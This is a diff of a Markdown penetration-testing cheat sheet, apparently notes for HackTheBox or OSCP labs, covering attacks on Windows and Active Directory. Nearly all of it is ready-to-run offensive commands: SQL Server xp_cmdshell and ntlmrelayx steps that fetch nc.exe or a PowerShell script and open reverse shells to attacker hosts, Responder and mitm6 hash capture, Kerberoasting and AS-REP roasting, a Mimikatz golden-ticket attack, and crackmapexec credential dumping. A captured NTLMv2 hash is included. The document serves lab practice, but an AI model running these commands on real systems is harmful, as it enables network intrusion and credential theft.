@@ -10,7 +10,10 @@ https://www.ired.team/
 netsh advfirewall firewall add rule name="SMB" protocol=TCP dir=in localport=445 action=allow
 netsh advfirewall firewall add rule name="SMB" protocol=TCP dir=out localport=445 action=allow
 ```
-
+```Shell
+# Connect RDP
+xfreerdp /u:<user> /p:<pwd> <ip> /f
+```
 
 #### SMB
 ```Shell
@@ -122,10 +125,9 @@ SQL> xp_cmdshell "powershell Invoke-WebRequest http://10.10.14.7/nc.exe -o C:\Wi
 SQL> xp_cmdshell "start /b C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.7 443"
 
 # Capture hash 
+```shell
 SQL> xp_dirtree '\\10.10.14.7\algo'
-
-responder -I tun0 
-#mssql-svc::QUERIER:5890d2ad2897e641:347A0136C3E30308B159CC3CA9B94AB0:01010000000000008070AE33E608D8015E3FB7F6F0A5952C00000000020008004600540048004D0001001E00570049004E002D00570059004E004100370043004400340034004800520004003400570049004E002D00570059004E00410037004300440034003400480052002E004600540048004D002E004C004F00430041004C00030014004600540048004D002E004C004F00430041004C00050014004600540048004D002E004C004F00430041004C00070008008070AE33E608D8010600040002000000080030003000000000000000000000000030000053744682CCB052C3C439A4E4224A65E6F6EA26598195450C9A37C27CAB683EA90A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003700000000000000000000000000
+mssql-svc::QUERIER:5890d2ad2897e641:347A0136C3E30308B159CC3CA9B94AB0:01010000000000008070AE33E608D8015E3FB7F6F0A5952C00000000020008004600540048004D0001001E00570049004E002D00570059004E004100370043004400340034004800520004003400570049004E002D00570059004E00410037004300440034003400480052002E004600540048004D002E004C004F00430041004C00030014004600540048004D002E004C004F00430041004C00050014004600540048004D002E004C004F00430041004C00070008008070AE33E608D8010600040002000000080030003000000000000000000000000030000053744682CCB052C3C439A4E4224A65E6F6EA26598195450C9A37C27CAB683EA90A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003700000000000000000000000000
 john --wordlist=rockyou.txt hash.txt
 hashcat -m 5600 mssql-svc.netntlmv2 rockyou.txt -o cracked.txt --force
 ```
@@ -140,10 +142,40 @@ hashcat -m 5600 mssql-svc.netntlmv2 rockyou.txt -o cracked.txt --force
 >go
 ```
 
-### AD
+### SMB relay
+```Shell
+responder -I tun0 
+responder -I tun0 -rdw
+\\SQLServer\hola
+john --wordlist=rockyou.txt hash.txt
+hashcat -m 5600 mssql-svc.netntlmv2 rockyou.txt -o cracked.txt --force
+```
+
+### SMB ntlmrelayx - SMB signing:false
+```Shell
+# nano /etc/responder/Responder.conf
+# Off SMB
+responder -I tun0 -rdw
+impacket-ntlmrelayx  -tf target.txt -smb2support
+# get hash NTLM
+impacket-ntlmrelayx  -tf target.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 443"
+\\SQLServer\hola
+```
+
+### SMB IPv6
+```Shell
+mitm6 -d yuncorp.local
+```
+
+
+## AD
 *** importante sincronisar tiempo con DC "rdate -n 10.10.10.52"
 
-#### Enumerate
+```Shell
+crackmapexec smb 192.168.100.0/24 
+```
+
+### Enumerate
 ```Shell
 crackmapexec smb 10.10.10.52 -u 'James' -p 'J@m3s_P@ssW0rd!'  --shares
 ```
@@ -156,13 +188,12 @@ kerbrute userenum --domain htb.local /opt/SecLists/Usernames/xato-net-10-million
 ldapdomaindump -u "htb\James" -p "J@m3s_P@ssW0rd\!" 10.10.10.52 
 ```
 
-#### Kerberoasting
+### Kerberoasting
 1.- Dump in memory
 2.- Request TGS
 
-```Shell
 impacket-GetNPUsers 'htb.local/james:J@m3s_P@ssW0rd!' -dc-ip 10.10.10.52 # Dump the full list of ASP-REP vulnerable users
-```
+
 #### Request TGS
 ```Shell
 impacket-GetNPUsers -request yuncorp.local/jenriquez:P@$$w0rd! # Get TGS to any service
@@ -171,8 +202,39 @@ impacket-GetNPUsers -request yuncorp.local/jenriquez:P@$$w0rd! # Get TGS to any 
 hashcat -m 13100 -a 0 hash.txt rockyou.txt --force
 ```
 
+### ASPREPROAST Attack - Get tickets without pwd
+```Shell
+rpcclient -U "jenriquez" -W <pwd> 192.168.100.20
+>enumdomusers
+```
+```Shell
+# User configurate = DONT_REQ_PREAUTH - Create packet KRB_AS_REQ
+impacket-GetNPUsers yuncorp.local/ -usersfile users.tx --format hashcat 
+```
+```Shell
+hashcat -m 13100 -a 0 hash.txt rockyou.txt --force
+```
 
+### Golden ticket attack - create TGT - first get the krbtgt hash NTLM 
+# Required Admin Domain
+```Shell
+IEX ([System.Text.Encoding]::UTF8.GetString((New-Object system.net.webClient).DownloadString('http://10.10.14.2/Invoke-Mimikatz.ps1');
+Invoke.Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"' > output.txt
+Invoke.Mimikatz -Command '"kerberos::golden /domain:yuncorp.local /sid:<sid> /rc4:<krbtgt hash> /user:Administrador /ticket:golden.kirbi"' # SID get output.txt
+# Machine User Domain
+mimikatz.exe
+kerberos:ptt gold.kirbi
+exit
+>dir \\DC\admin$
+>dir \\DC\c$
 
+#Shell
+```shell
+impacket-ticketer -nthast <krbtgt_ntlm> -domain-sid <sid> -domain yuncorp.local Administrator  #output Administrator.ccache
+export KRB5CCNAME=/root/Administrator.ccache
+impacket-psexec -k -n yuncorp.local/Administrator@DC-Corp cmd.exe   # Add domain in /etc/hosts
+```
+  
 #### Kerberos MS14-068
 https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html
 
@@ -193,7 +255,7 @@ root@kali:/OSCPv3/htb/Optimum# python -m SimpleHTTPServer 80
 10.10.10.8 - - [12/Jan/2022 21:58:35] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
 ```
 ```Shell
-C:\Users\kostas\Desktop>start /b C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 443
+C:\Users\kostas\Desktop>start /b C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 443
 C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 443
 ```
 ```Shell
@@ -270,6 +332,7 @@ net localgroup "Remote Desktop Users" admin /add
 crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' -x 'whoami'
 crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' --sam
+crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' -M rdp -o action=enable # activate rdp
 crackmapexec smb 10.10.10.40 -u 'Administrator' -H cdf51b162460b7d5bc898f493751a0cc -x 'whoami'
 crackmapexec smb 10.10.10.40 -u 'Administrator' -H cdf51b162460b7d5bc898f493751a0cc -M mimikatz -o COMMAND="privilege::debug token::elevate sekurlsa::logonpasswords exit"
 crackmapexec smb 10.10.10.40 -u 'admin' -p 'kdeEjDowkS*' -x '\\10.10.14.2\smbfolder\nc.exe -e cmd 10.10.14.2 4444'
